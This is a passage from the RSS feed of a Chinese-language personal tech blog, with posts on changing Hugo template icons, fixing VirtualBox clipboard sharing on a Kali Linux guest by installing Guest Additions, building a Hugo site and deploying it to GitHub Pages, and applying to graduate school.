&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                {{ T &amp;#34;article.readingTime&amp;#34; .ReadingTime }}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    {{ end }}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;footer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{{ end }}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;小結&#34;&gt;小結&lt;/h2&gt;
&lt;p&gt;一路 trace code 改下來真的很花時間，如果是修改一般的網頁模板的圖示應該會比較輕鬆(不論是純JS或是三大框架)，只要對專案 CTRL+F 就可以找到哪裡引用了圖示資源再改掉他就好，哪像 hugo 這麼抽象化。&lt;/p&gt;
&lt;p&gt;這個案例凸顯 Hugo 為了增加可擴充性，必須犧牲掉部分的可讀性，尤其是針對無法擴充的部分，所以在開發時設想哪些功能未來會被擴充很重要阿，後期增加的 features 要顧慮到這點也就更難了。正是 OOP open–closed principle 的寫照:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&amp;ldquo;Software entities should be open for extension, but closed for modification.&amp;rdquo; - Robert C. Martin&amp;rsquo;s 1996&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>VirtualBox 無法共用剪貼簿的萬年老 Bug</title>
        <link>https://weberlu88.github.io/p/virtualbox-clipboard/</link>
        <pubDate>Tue, 14 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://weberlu88.github.io/p/virtualbox-clipboard/</guid>
        <description>&lt;p&gt;Kail linux 官網提供了很詳細的&lt;a class=&#34;link&#34; href=&#34;https://www.kali.org/docs/virtualization/install-virtualbox-guest-vm/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;安裝教學文件&lt;/a&gt;，我們可以從virtualbox 的設定中看到我們開啟了 Shared Clipboard 功能。倘若你實際上卻無法與 host 主機共用剪貼簿，那就恭喜跟我一樣碰到 virtualbox 的老問題了。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;也有可能是 Kail linux ISO 的問題，因為我同台 host 也裝了 ubuntu、centOS 的 vm 卻沒有此狀況。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 325; 
			flex-basis: 781px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/virtualbox-clipboard/img-setting1.png&#34; data-size=&#34;788x242&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/virtualbox-clipboard/img-setting1.png&#34;
			width=&#34;788&#34;
			height=&#34;242&#34;
			srcset=&#34;https://weberlu88.github.io/p/virtualbox-clipboard/img-setting1_hu57d3aefb7a02ee17ac4a3c680eea838d_18674_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/virtualbox-clipboard/img-setting1_hu57d3aefb7a02ee17ac4a3c680eea838d_18674_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;開啟雙通道&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;開啟雙通道&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 288; 
			flex-basis: 693px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/virtualbox-clipboard/img-setting2.png&#34; data-size=&#34;786x272&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/virtualbox-clipboard/img-setting2.png&#34;
			width=&#34;786&#34;
			height=&#34;272&#34;
			srcset=&#34;https://weberlu88.github.io/p/virtualbox-clipboard/img-setting2_hud88cd5c5b270cc328ae31b7b6cf7ba7c_24961_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/virtualbox-clipboard/img-setting2_hud88cd5c5b270cc328ae31b7b6cf7ba7c_24961_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;有裝GuestAddition&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;有裝GuestAddition&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;正文開始&#34;&gt;正文開始&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;可參考英文論壇的解法 &lt;a class=&#34;link&#34; href=&#34;https://askubuntu.com/questions/22743/how-do-i-install-guest-additions-in-a-virtualbox-vm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://askubuntu.com/questions/22743/how-do-i-install-guest-additions-in-a-virtualbox-vm&lt;/a&gt; 或是中文翻譯版 &lt;a class=&#34;link&#34; href=&#34;https://ubuntuqa.com/zh-tw/article/66.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://ubuntuqa.com/zh-tw/article/66.html&lt;/a&gt; 或 &lt;a class=&#34;link&#34; href=&#34;https://www.jinnsblog.com/2021/05/virtualbox-guest-additions-install-guide.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.jinnsblog.com/2021/05/virtualbox-guest-additions-install-guide.html&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因為我們已經在 virtualbox 的設定中加入了 GuestAddition.iso，因此可以在 vm 的桌面看到一個光碟機。點開來看裡面有 auturun 的執行檔，但是看起來就是沒有 work，需要手動安裝。如果你沒有在 virtualbox 設定中加入 GuestAddition.iso，須執行這項:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-terminal&#34; data-lang=&#34;terminal&#34;&gt;sudo apt-get update
sudo apt-get install virtualbox-guest-additions-iso&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 116; 
			flex-basis: 279px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/virtualbox-clipboard/img-vbox.PNG&#34; data-size=&#34;800x686&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/virtualbox-clipboard/img-vbox.PNG&#34;
			width=&#34;800&#34;
			height=&#34;686&#34;
			srcset=&#34;https://weberlu88.github.io/p/virtualbox-clipboard/img-vbox_hua17abb838d52c3b1478eac5330720e72_270684_480x0_resize_box_3.PNG 480w, https://weberlu88.github.io/p/virtualbox-clipboard/img-vbox_hua17abb838d52c3b1478eac5330720e72_270684_1024x0_resize_box_3.PNG 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;我們的目標是掛載光碟並執行 VBoxLinuxAdditions.run&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;我們的目標是掛載光碟並執行 VBoxLinuxAdditions.run&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其他版本的 Linux 也許可以從檔案管理員執行 &lt;code&gt;VBoxLinuxAdditions.run&lt;/code&gt; 這個 shellscript。但 kali 不行，首先我們要掛載這個映像檔然後執行它:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-terminal&#34; data-lang=&#34;terminal&#34;&gt;sudo mount /dev/cdrom /mnt              # or any other mountpoint
cd /mnt
sudo sh ./VBoxLinuxAdditions.run
reboot&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;雖然我在執行的時候噴 kernal header not found，但重開機後還是成功可共用剪貼簿了。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 190; 
			flex-basis: 456px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/virtualbox-clipboard/img-kernel-header-not-found.jpeg&#34; data-size=&#34;759x399&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/virtualbox-clipboard/img-kernel-header-not-found.jpeg&#34;
			width=&#34;759&#34;
			height=&#34;399&#34;
			srcset=&#34;https://weberlu88.github.io/p/virtualbox-clipboard/img-kernel-header-not-found_hu7c889c7627b37a1f452cf51371ffd366_252994_480x0_resize_q75_box.jpeg 480w, https://weberlu88.github.io/p/virtualbox-clipboard/img-kernel-header-not-found_hu7c889c7627b37a1f452cf51371ffd366_252994_1024x0_resize_q75_box.jpeg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;ps: debian 的 header 是 linux-headers-amd64，即是更新了這個錯誤訊息也一樣&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;ps: debian 的 header 是 linux-headers-amd64，即是更新了這個錯誤訊息也一樣&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Hugo tutorial</title>
        <link>https://weberlu88.github.io/p/hugo-tutorial/</link>
        <pubDate>Mon, 13 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://weberlu88.github.io/p/hugo-tutorial/</guid>
        <description>&lt;img src="https://weberlu88.github.io/p/hugo-tutorial/img-hugo-logo.png" alt="Featured image of post Hugo tutorial" /&gt;&lt;blockquote&gt;
&lt;p&gt;這篇文章將會教你如何用 hugo 的模板建立靜態網站，並且部屬到 github page 上作為你的個人網站。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;hugo-是什麼&#34;&gt;Hugo 是什麼&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;&amp;ldquo;Hugo is a fast and modern static site generator written in Go, and designed to make website creation fun again.&amp;rdquo;&lt;/em&gt;  by &lt;a class=&#34;link&#34; href=&#34;https://gohugo.io/about/what-is-hugo/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;官網&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;優點&lt;/strong&gt;:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;懶人 - Hugo 是一個靜態網頁生成器，使用者不需要對 html、css、js 進行任何操作，不怕套了精美的模板卻改不動。&lt;/li&gt;
&lt;li&gt;簡潔 - 使用markdown格式撰寫文章，資源讀取簡單，而且開發時可以 life-reload 頁面。&lt;/li&gt;
&lt;li&gt;漂亮 - 有各式各樣的模板供你選擇。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;實用連結&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/playlist?list=PLLAZ4kZ9dFpOnyRlyS-liKL5ReHDcj4G3&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Hugo - Static Site Generator | Tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.demo.off-record.net/21/1/install-hugo/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Hugo手把手安裝教學&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.jimmycai.com/p/hugo-theme-stack/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Hugo 主题 Stack&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;hugo-開發環境安裝&#34;&gt;Hugo 開發環境安裝&lt;/h2&gt;
&lt;p&gt;官網教學👉 &lt;a class=&#34;link&#34; href=&#34;https://gohugo.io/getting-started/installing/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://gohugo.io/getting-started/installing/&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;要使用 hugo 來開發不需要安裝 go 只需要安裝 hugo 即可，在 windows 環境下需要用 scoop、choco 在 cmd 中安裝；如果沒有這兩個套件管理工具或不想打指令，也可以從官方 &lt;a class=&#34;link&#34; href=&#34;https://github.com/gohugoio/hugo/releases&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;github release&lt;/a&gt; 下載 zip 檔，有些模板會用到 extended 版，最後記得將 hugo.exe 的 bin 目錄添加到環境變數中。詳細操作可以參考上方實用連結的YT頻道。&lt;/p&gt;
&lt;h2 id=&#34;建立你的網站&#34;&gt;建立你的網站&lt;/h2&gt;
&lt;p&gt;Hugo 使用 CLI(command line interface) 進行網站的本地部屬和打包等功能，常見的指令有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;hugo new site&lt;/strong&gt; &amp;lt;&lt;strong&gt;directory-name&lt;/strong&gt;&amp;gt;: 在指定目錄建立新的專案。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;hugo server&lt;/strong&gt;: 在本機(localhost)部屬網站，可以 hot-update 讓你一邊編輯一邊查看成果。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;hugo&lt;/strong&gt;: 根據目錄中的 &lt;code&gt;config&lt;/code&gt; file 打包(build)專案，打包好的專案會寫入 &lt;code&gt;/docs&lt;/code&gt; 目錄，記得每次打包前要先刪除舊的 &lt;code&gt;/docs&lt;/code&gt; 唷，因為這個指令只會覆寫檔案，如果你刪除了一個頁面 hugo 不會幫你在 &lt;code&gt;/docs&lt;/code&gt; 中刪除他。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;每個指令都可以帶相關參數，有關更多指令和參數可參考官網&lt;!-- raw HTML omitted --&gt;👉&lt;!-- raw HTML omitted --&gt; &lt;a class=&#34;link&#34; href=&#34;https://gohugo.io/commands/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://gohugo.io/commands/&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;建議使用 VScode、Atom、Sublime 等程式編輯器來開啟專案，這類 ide 都有內建終端機好讓你下 CLI 指令。&lt;/p&gt;
&lt;h3 id=&#34;套用模板&#34;&gt;套用模板&lt;/h3&gt;
&lt;p&gt;Hugo 的社群提供了各式各樣的模板&lt;!-- raw HTML omitted --&gt;👉&lt;!-- raw HTML omitted --&gt; &lt;a class=&#34;link&#34; href=&#34;https://themes.gohugo.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://themes.gohugo.io/&lt;/a&gt;。&lt;br&gt;
Hugo 模板允許大量的客製化，網站的樣式、架構、config 配置取決於模板的設計。挑模板除了考慮美觀，也建議挑個有操作手冊的以便日後的更改和維護。&lt;/p&gt;
&lt;p&gt;比如說這個網站的模板 &lt;a class=&#34;link&#34; href=&#34;https://github.com/CaiJimmy/hugo-theme-stack&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;hugo-theme-stack&lt;/a&gt; 就有附上 github repo 和中英文文檔，我在更改左右側選單、自訂義css上方便許多。&lt;/p&gt;
&lt;h3 id=&#34;編輯&#34;&gt;編輯&lt;/h3&gt;
&lt;p&gt;在 hugo 專案上撰寫網頁內容時再簡單不過了，hugo 使用 markdown 文件來記錄網站內容，文章內容放在 &lt;code&gt;/content&lt;/code&gt; 目錄中，假如說我今天要建立一個新的頁面，則可在 &lt;code&gt;/content/post&lt;/code&gt; 中新增一個資料夾，檔案格式為:
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/02-hugo-tutorial  (頁面資料夾)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  |-- index.md     (文章內容)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  |-- img-01.png   (index.md 引用的本地資源)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  |-- img-02.png   (index.md 引用的本地資源)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/p&gt;
&lt;h2 id=&#34;github-page-創建及部屬&#34;&gt;Github Page 創建及部屬&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;官方文件 &lt;!-- raw HTML omitted --&gt;👉&lt;!-- raw HTML omitted --&gt; &lt;a class=&#34;link&#34; href=&#34;https://docs.github.com/en/pages/getting-started-with-github-pages/about-github-pages&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://docs.github.com/en/pages/getting-started-with-github-pages/about-github-pages&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Github 為使用者提供了靜態網站的 hosting service，分成 project site, user site 和 organization site 幾種網頁，每個 repository 可以建一個 project site，每個帳號可以 host 一個 user site。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;user site 的 repo 名稱要取的跟你的username相同，也是你的網域名稱(domain): &lt;code&gt;&amp;lt;username&amp;gt;.github.io&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;user site 的網站連結: &lt;code&gt;http(s)://&amp;lt;username&amp;gt;.github.io&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;建立好對應的 github repo 後再至 &lt;em&gt;setting &amp;gt; pages&lt;/em&gt; 開啟網站。這個頁面可以選擇要從 repo 的哪個分支/哪個資料夾部屬網站。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;預設 main branch&lt;/strong&gt;: 就是以前的 master。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;root folder&lt;/strong&gt;: 部屬整個 repo。repo 須放 hugo 專案的 &lt;code&gt;public&lt;/code&gt; 資料夾。這種配置可將 source code 和 deployed site 獨立分開來，兩個各一個 repo。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;docs folder&lt;/strong&gt;: 部屬 repo 中的 &lt;code&gt;/docs&lt;/code&gt;。懶人方法是把整個 hugo 專案放在 repo 中，每次 build 好時把 &lt;code&gt;/public&lt;/code&gt; 改名就可以 commit 了。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最後，我們要修改 hugo 專案的 config 檔，指定專案的網址為 &lt;code&gt;baseurl: https://&amp;lt;username&amp;gt;.github.io/&lt;/code&gt;，不然無法載入 js、css、img 等資源喔。&lt;/p&gt;

</description>
        </item>
        <item>
        <title>【110】【台大資管/交大資管/成大資管/中央資管/交大資工/清大資工/成大資工】【推甄心得】</title>
        <link>https://weberlu88.github.io/p/graduate-apply/</link>
        <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://weberlu88.github.io/p/graduate-apply/</guid>
        <description>&lt;img src="https://weberlu88.github.io/p/graduate-apply/matt-le-SJSpo9hQf7s-unsplash.jpg" alt="Featured image of post 【110】【台大資管/交大資管/成大資管/中央資管/交大資工/清大資工/成大資工】【推甄心得】" /&gt;&lt;p&gt;本來想說江湖版的文公開發布不太好，但是這篇文就當作部落格的第一篇文吧，若有不適再下架xd&lt;/p&gt;
&lt;p&gt;我覺得我們資管系和中央其他系不同的地方就是。資管的大家都在為自己的人生認真，生活步調像是閃爍霓虹的快，一切就是為了未來更好的條件與發展。&lt;strong&gt;但是，百忙之中，卻有人願意停下來關心你一下&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;從小到大的求學階段，我看過天賦異稟卻沒那麼努力的人；或者是努力付出了許多，卻不一定得到那麼多的人。不過呢，&lt;strong&gt;你在中央資管的大家庭，你就不是一個人單打獨鬥&lt;/strong&gt;，學長姐、同儕間願意分享經歷、分享資源，是我最感謝、最珍惜的事情。祝福中央資管的各位未來順利、幸福、愉快。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前言 《&lt;a class=&#34;link&#34; href=&#34;https://www.notion.so/vs-caefba2c37174c338ed6cff4788eb1de&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;資工所 vs 資管所 怎麼選??&lt;/a&gt;》&lt;/li&gt;
&lt;li&gt;正篇 《&lt;a class=&#34;link&#34; href=&#34;https://www.notion.so/d482bef280ae4e3b8b4d534cbe9162bb&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;推甄經驗分享&lt;/a&gt;》&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        
    </channel>
</rss>
